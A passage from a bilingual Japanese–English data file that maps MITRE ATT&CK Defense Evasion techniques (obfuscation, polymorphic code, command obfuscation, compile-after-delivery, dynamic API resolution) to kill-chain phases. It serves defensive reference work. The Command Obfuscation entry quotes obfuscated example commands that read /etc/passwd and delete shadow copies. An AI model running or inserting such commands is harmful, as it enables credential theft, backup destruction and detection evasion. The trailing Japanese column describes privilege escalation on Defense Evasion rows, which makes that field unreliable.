Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.014,ポリモーフィックコード,Polymorphic Code,攻撃者は、検出を回避するためにポリモーフィックコード（メタモーフィックコードまたはミューテーティングコードとも呼ばれる）を利用する可能性があります。ポリモーフィックコードは、コード実行中にランタイムフットプリントを変更できるソフトウェアの一種です。(引用: polymorphic-blackberry) ソフトウェアを実行するたびに、コードは元のコードと同じ目的または目標を達成する別のバージョンに変化します。この機能により、マルウェアはウイルス対策ツールやマルウェア対策ツールなどの従来の署名ベースの防御を回避できます。(引用: polymorphic-sentinelone)\nその他の難読化テクニックは、[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)、または[暗号化/エンコードされたファイル](https://attack.mitre.org/techniques/T1027/013)などのアクションを実行するためにミューテーションエンジンを使用するなど、意図した効果を達成するためにポリモーフィックコードと組み合わせて使用できます。(引用: polymorphic-linkedin)(引用: polymorphic-medium),"Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.(Citation: polymorphic-blackberry) With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.(Citation: polymorphic-sentinelone) \nOther obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation: polymorphic-medium)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.010,コマンド難読化,Command Obfuscation,"攻撃者は、検出を妨げるためにコマンド実行中にコンテンツを難読化する可能性があります。コマンドライン難読化は、コマンドやスクリプト内の文字列やパターンを署名付けや分析を困難にする手法です。このタイプの難読化は、配信されたペイロード（例：[フィッシング](https://attack.mitre.org/techniques/T1566)や[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)）によって実行されるコマンドや、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して対話的に実行されるコマンドに含めることができます。(引用: Akamai JS)(引用: Malware Monday VBE)

例えば、攻撃者は、スペース、<code>^</code>、<code>+</code>、<code>$</code>、<code>%</code>などのさまざまな記号やエスケープ文字を利用する構文を悪用して、同じ意図した機能を維持しながらコマンドを分析困難にする可能性があります。(引用: RC PowerShell) 多くの言語は、Base64やURLエンコーディングの形で組み込みの難読化をサポートしています。(引用: Microsoft PowerShellB64) 攻撃者はまた、文字列分割（<code>“Wor”+“d.Application”</code>）、文字の順序と大文字小文字の区別（<code>rev <<<'dwssap/cte/ tac'</code>）、グロビング（<code>mkdir -p '/tmp/:&$NiA'</code>）、およびトークン/環境変数/入力ストリームを介して文字列を渡すさまざまなトリックを介してコマンド難読化を手動で実装する可能性があります。(引用: Bashfuscator Command Obfuscators)(引用: FireEye Obfuscation June 2017)

攻撃者はまた、コマンドによって呼び出されるバイナリへの参照を難読化するために、ディレクトリトラバーサルのようなトリックを使用するかもしれません(<code>C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete</code>)。(引用：Twitter Richard WMIC）

<code>Invoke-Obfuscation</code>や<code>Invoke-DOSfucation</code>などのツールも、コマンドを難読化するために使用されています。(引用: Invoke-DOSfuscation)(引用: Invoke-Obfuscation)","Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)

For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)

Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)

Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.004,配信後のコンパイル,Compile After Delivery,"攻撃者は、コンパイルされていないコードとしてファイルを被害者に配信することにより、ペイロードの発見と分析を困難にしようとする可能性があります。テキストベースのソースコードファイルは、実行可能ファイル/バイナリを標的とする保護からの分析と精査を破壊する可能性があります。これらのペイロードは、実行前にコンパイルする必要があります。通常、ilasm.exe(引用: ATTACK IQ)、csc.exe、またはGCC/MinGWなどのネイティブユーティリティを介して行われます。(引用: ClearSky MuddyWater Nov 2018)

ソースコードペイロードはまた、[フィッシング](https://attack.mitre.org/techniques/T1566)として配信されるものなど、他のファイル内に暗号化、エンコード、および/または埋め込まれる場合があります。ペイロードはまた、バンドルされたコンパイラと実行フレームワークで後で適切な実行可能バイナリに（再）コンパイルされる前に、ネイティブOSにとって認識できず本質的に良性の形式（例：macOS/Linux上のEXE）で配信される場合もあります。(引用: TrendMicro WindowsAppMac)","Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.007,動的API解決,Dynamic API Resolution,"攻撃者は、マルウェアによって呼び出されるAPI関数を難読化してから動的に解決し、悪意のある機能を隠蔽し、防御分析を妨害する可能性があります。マルウェアは一般的に、プロセス、ファイル、その他のシステムアーティファクトに関連するものなど、さまざまなタスクを実行するためにOSによって提供されるさまざまな[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数を使用します。

マルウェアによって呼び出されるAPI関数は、ペイロードファイル内の文字列などの静的アーティファクトを残す可能性があります。防御アナリストはまた、インポートアドレステーブル（IAT）や、呼び出しコードを関数を提供する共有モジュールに動的にリンクするのに役立つその他の構造を介して、バイナリファイルが実行する可能性のある関数を明らかにすることができます。(引用: Huntress API Hash)(引用: IRED API Hashing)

静的またはその他の防御分析を回避するために、攻撃者は動的API解決を使用して、マルウェアの特性と機能を隠蔽する可能性があります。[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)と同様に、動的API解決は、実行時に解決されて呼び出されるまで、ファイル署名を変更し、悪意のあるAPI関数呼び出しを難読化する可能性があります。

マルウェアのAPI関数呼び出しを難読化するために、さまざまな方法が使用される場合があります。例えば、関数名のハッシュは、リテラル文字列の代わりにマルウェアによく保存されます。マルウェアはこれらのハッシュ（またはその他の識別子）を使用して、<code>GetProcAddress()</code>や<code>LoadLibrary()</code>などの関数を使用して、リンクおよびロードプロセスを手動で再現できます。これらのハッシュ/識別子は、暗号化やその他の文字列操作トリックを使用してさらに難読化することもできます（実行中にさまざまな形式の[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)が必要です）。(引用: BlackHat API Packers)(引用: Drakonia HInvoke)(引用: Huntress API Hash)","Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.

API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)

To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.

Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

